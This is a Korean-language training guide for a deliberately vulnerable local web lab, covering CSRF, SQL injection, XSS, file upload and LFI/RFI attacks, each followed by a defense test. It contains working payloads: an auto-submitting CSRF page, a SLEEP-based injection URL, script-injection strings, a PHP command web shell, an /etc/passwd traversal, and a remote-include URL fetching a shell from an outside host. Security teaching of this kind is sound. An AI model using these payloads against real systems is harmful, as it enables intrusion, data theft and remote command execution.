# 웹 보안 취약점 실습 가이드

이 문서는 웹 보안 실습 플랫폼에서 OWASP Top 10 취약점을 안전하게 테스트하는 방법을 안내합니다.

---

## 🎯 테스트 환경 설정

### 1. 기본 접속 정보
- **웹사이트**: http://localhost:8080
- **보안 설정 제어판**: http://localhost:8080/security.php
- **게시판**: http://localhost:8080/board/list.php

### 2. 권한별 테스트 계정
| 권한 | 사용자명 | 비밀번호 | 설명 |
|------|----------|----------|------|
| 👑 관리자 | `admin` | `admin123` | 모든 기능 접근 가능 |
| 👤 일반사용자 | `user` | `user123` | 기본 기능 사용 가능 |
| 👻 게스트 | `guest` | `guest123` | 읽기 전용 접근 |

### 3. 보안 설정 제어
**중요**: 각 취약점 테스트 전에 `http://localhost:8080/security.php`에서 해당 보안 기능을 OFF로 설정하세요.

---

## 🔐 1. CSRF (Cross-Site Request Forgery)

### 📍 취약한 위치
- **취약 경로**: `web/board/write.php`, `web/board/view.php`
- **세부 위치**: `write.php:34-37`, `view.php:32-36`

### 🛡️ 보안 설정
1. `http://localhost:8080/security.php` 접속
2. **🔗 게시판 통합 페이지 설정** 박스에서
3. **CSRF 토큰 보호** OFF로 설정

### 🎯 실습 방법

#### **방법 1: 취약한 페이지 **
1. **로그인** (admin/admin123 또는 user/user123)
2. **공격 페이지 접속**: `http://localhost:8080/uploads/csrf_attack.html`
3. "Click Here!" 버튼 클릭 또는 3초 후 자동 실행
4. **결과 확인**: `http://localhost:8080/board/list.php`에서 공격 게시글 확인
```
<!DOCTYPE html>
<html>
<head>
    <title>CSRF Attack Test</title>
</head>
<body>
    <h1>CSRF Attack Demo</h1>

    <form action="http://localhost:8080/board/write.php" method="POST">
        <input type="hidden" name="title" value="🚨 CSRF 공격 성공!" />
        <input type="hidden" name="content" value="CSRF Attack Post - 이 글은 CSRF 공격으로 작성되었습니다! 사용자가 모 르는 사이에 게시글이 작성되었습니다." />
        <input type="submit" value="Click Here!" />
    </form>

    <p>위 버튼을 클릭하면 CSRF 공격이 실행됩니다.</p>

    <!-- 자동 실행 (페이지 로드 시) -->
    <script>
        // 3초 후 자동으로 폼 제출
        setTimeout(function() {
            document.forms[0].submit();
        }, 3000);
    </script>
</body>
</html>
```

### ✅ 방어 기능

### **CSRF 토큰 보호** 기능
- 방법 1 공격 재시도
- **결과**: "CSRF token validation failed." 에러 발생

---

## 💉 2. SQL Injection

### 📍 취약한 위치
- **게시글 상세보기**: `web/board/view.php:83`
- **게시글 검색**: `web/board/list.php:49`

### 🛡️ 보안 설정
1. `http://localhost:8080/security.php` 접속
2. **📝 게시판 뷰 페이지 설정**: **SQL 인젝션 방지** OFF
3. **📋 게시판 리스트 페이지 설정**: **SQL 인젝션 방지 (검색기능)** OFF

### 🎯 실습 방법

#### **방법 1: time-based blind sqli **
```
http://localhost:8080/board/list.php?search=admin%27%20OR%20SLEEP(2)--%20
```


### ✅ 방어 테스트
1. 해당 **SQL 인젝션 방지** 기능 ON으로 설정
2. 동일한 공격 재시도
3. **결과**: Prepared Statements로 안전하게 처리됨

---

## 🚨 3. XSS (Cross-Site Scripting)

### 📍 취약한 위치

#### **💾 Stored XSS (저장형)**
- **게시글 내용 출력**: `web/board/view.php:124-126`
- **댓글 내용 출력**: `web/board/view.php:185-188`
- **게시판 목록**: `web/board/list.php:142-148`

#### **🔄 Reflected XSS (반사형)**
- **검색 결과 표시**: `web/board/list.php:192`
- **검색 입력 필드**: `web/board/list.php:202`

### 🛡️ 보안 설정
1. `http://localhost:8080/security.php` 접속
2. **🔗 게시판 통합 페이지 설정**에서
3. **XSS 대책1 - 응답 인코딩** OFF
4. **XSS 대책2 - 출력 필터링** OFF

### 🎯 실습 방법

#### **💾 Stored XSS - 게시글 작성**
1. 새 글 작성에서 다음 입력:
```html
<script>alert("Stored XSS 공격!");</script>
```
2. 게시글 저장 후 상세보기에서 스크립트 실행 확인

#### **💾 Stored XSS - 댓글 작성**
1. 게시글 댓글에 다음 입력:
```html
<img src="x" onerror="alert('저장된 XSS!')">
```
2. 댓글 작성 후 페이지 새로고침하여 스크립트 실행 확인

#### **🔄 Reflected XSS - 검색 기능**
1. **URL 직접 접근**:
```
http://localhost:8080/board/list.php?search=<script>alert("Reflected XSS!");</script>
```

2. **입력 필드 공격**:
```
http://localhost:8080/board/list.php?search="><script>alert("XSS")</script>
```

 공격 유형 | 저장 위치 | 지속성 | 영향 범위 | 탐지 난이도 |
|-----------|-----------|--------|-----------|-------------|
| **Stored XSS** | 데이터베이스 | 영구적 | 해당 게시글을 보는 모든 사용자 | 쉬움 |
| **Reflected XSS** | URL 파라미터 | 일시적 | 악성 URL을 클릭한 사용자만 | 어려움 |



### ✅ 방어 테스트
1. **XSS 대책2 - 출력 필터링** ON으로 설정
2. 동일한 Stored/Reflected 공격 재시도
3. **결과**: `htmlspecialchars()`로 안전하게 인코딩되어 스크립트 실행 차단

---

## 📤 4. File Upload Vulnerabilities

### 📍 취약한 위치
- **파일 업로드**: `web/upload.php`

### 🛡️ 보안 설정
1. **📤 파일 업로드 페이지 설정**
2. **파일 확장자 검사** OFF
3. **MIME 타입 검사** OFF

### 🎯 실습 방법

#### **웹셸 업로드**
1. 다음 내용으로 `shell.php` 파일 생성:
```php
<?php
if(isset($_GET['cmd'])) {
    system($_GET['cmd']);
}
?>
```

2. `upload.php`에서 파일 업로드
3. 업로드된 파일 실행:
```
http://localhost:8080/uploads/shell.php?cmd=ls -la
http://localhost:8080/uploads/shell.php?cmd=whoami
```

#### **이미지 위장 공격**
1. `.jpg.php` 확장자로 웹셸 업로드 시도
2. MIME 타입 조작하여 우회 시도

### ✅ 방어 테스트
1. **파일 확장자 검사** + **MIME 타입 검사** ON
2. 동일한 악성 파일 업로드 시도
3. **결과**: 허용되지 않은 파일 타입으로 차단

---

## 📁 5. LFI/RFI (File Inclusion)

### 📍 취약한 위치
- **파일 뷰어**: `web/file_viewer.php`

### 🛡️ 보안 설정
1. **👁️ 파일 뷰어 페이지 설정**
2. **디렉토리 트레버셜 방지 (LFI)** OFF
3. **원격 파일 포함 방지 (RFI)** OFF

### 🎯 실습 방법

#### **LFI (Local File Inclusion)**
```
http://localhost:8080/file_viewer.php?file=../../../../etc/passwd
```

#### **RFI (Remote File Inclusion)**
```
http://localhost:8080/file_viewer.php?file=https://raw.githubusercontent.com/zithub0/web_security/main/web/uploads/shell.phtml&cmd=pwd
http://localhost:8080/file_viewer.php?file=http://localhost/uploads/shell.phtml&cmd=pwd
```

### ✅ 방어 테스트
1. **LFI/RFI 보호** ON으로 설정
2. 동일한 공격 재시도
3. **결과**: 경로 패턴 차단으로 보호됨

---


